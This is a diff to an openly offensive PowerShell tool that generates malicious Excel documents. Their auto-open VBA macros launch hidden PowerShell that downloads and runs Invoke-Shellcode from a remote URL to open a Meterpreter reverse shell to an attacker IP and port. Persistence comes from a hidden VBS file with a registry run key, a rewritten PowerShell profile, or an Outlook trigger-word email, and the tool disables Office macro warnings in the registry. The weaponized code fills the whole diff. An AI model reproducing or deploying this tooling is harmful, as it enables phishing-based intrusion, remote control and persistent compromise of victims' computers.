@@ -12,7 +12,6 @@ display a menu of different attacks, all with different persistence methods. Onc
 When naming the document, don't include a file extension.
 
 These attacks use Invoke-Shellcode, which was created by Matt Graeber. Follow him on Twitter --> @mattifestation
-I also used some code snippets from Nikhil Mittal. Follow him on Twitter as well --> @nikhil_mitt
 
 
 .Attack Types
@@ -59,19 +58,21 @@ PS>
 
 #>
 
-#Define Attacker IP, Port and assign filename
-
 $global:defLoc = "$env:userprofile\Desktop"
+$global:IS_Url = Read-Host "Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version)"
 $global:IP = Read-Host "Enter IP Address"
 $global:Port = Read-Host "Enter Port Number"
 $global:Name = Read-Host "Enter the name of the document (Do not include a file extension)"
 $global:Name = $global:Name + ".xls"
 $global:FullName = "$global:defLoc\$global:Name"
 
-#Function for Registry Persistence. See Meterpreter Shell with Logon Persistence
-#under Attack Types above
-
 function Registry-Persistence {
+<#
+.SYNOPSIS
+Uses registry to persist after reboot
+.DESCRIPTION
+Drops a hidden VBS file and creates a registry key to execute is on startup
+#>
 
 #create macro
 
@@ -93,7 +94,7 @@ End Sub
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://goo.gl/LhrTtm')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
      
 Public Function Persist() As Variant
@@ -101,7 +102,7 @@ Public Function Persist() As Variant
     Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
     a.WriteLine ("Dim objShell")
     a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
-    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://goo.gl/LhrTtm')); Invoke-SHellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
+    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-SHellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
     a.WriteLine ("objShell.Run command,0")
     a.WriteLine ("Set objShell = Nothing")
     a.Close
@@ -145,7 +146,7 @@ $Workbook01 = $Excel01.Workbooks.Add(1)
 $Worksheet01 = $Workbook01.WorkSheets.Item(1)
 
 
-#Add VBA
+
 $ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
 $ExcelModule.CodeModule.AddFromString($Code)
 
@@ -167,11 +168,12 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Secu
 
 }
 
-#Function for Powershell Profile Persistence. See Meterpreter Shell with Powershell Profile Persistence
-#under Attack Types above
 function PowerShellProfile-Persistence{
 
 $Code = @"
+'Coded by Matt Nelson
+'twitter.com/enigma0x3
+'enigma0x3.wordpress.com
 
 Sub Auto_Open()
 
@@ -192,7 +194,7 @@ Public Function Execute() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://goo.gl/LhrTtm')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
 
 Public Function WriteWrapper() As Variant
@@ -215,7 +217,7 @@ End Function
 Public Function WriteProfile() As Variant
 Set fs = CreateObject("Scripting.FileSystemObject")
     Set a = fs.CreateTextFile("C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt", True)
-    a.WriteLine ("IEX ((New-Object Net.WebClient).DownloadString('http://goo.gl/LhrTtm')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force")
+    a.WriteLine ("IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force")
     a.Close
     GivenLocation = "C:\Windows\SysNative\WindowsPowerShell\v1.0\"
     OldFileName = "Profile.txt"
@@ -251,7 +253,7 @@ $Workbook01 = $Excel01.Workbooks.Add(1)
 $Worksheet01 = $Workbook01.WorkSheets.Item(1)
 
 
-#Add VBA
+
 $ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
 $ExcelModule.CodeModule.AddFromString($Code)
 
@@ -275,8 +277,7 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Secu
 
 
 
-#Function for Microsoft Outlook Persistence. SeeMeterpreter Shell with Microsoft Outlook Email Persistence
-#under Attack Types above
+
 function Outlook-Persistence{
 $Email = Read-Host "Enter Attacker Email Address"
 $Trigger = Read-Host "Enter Trigger Word"
@@ -300,7 +301,7 @@ End Sub
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
      
 Public Function Download() As Variant
@@ -424,7 +425,7 @@ $Workbook01 = $Excel01.Workbooks.Add(1)
 $Worksheet01 = $Workbook01.WorkSheets.Item(1)
 
 
-#Add VBA
+
 $ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
 $ExcelModule.CodeModule.AddFromString($Code)
 
@@ -445,6 +446,25 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Secu
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
 
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 #Determine Attack
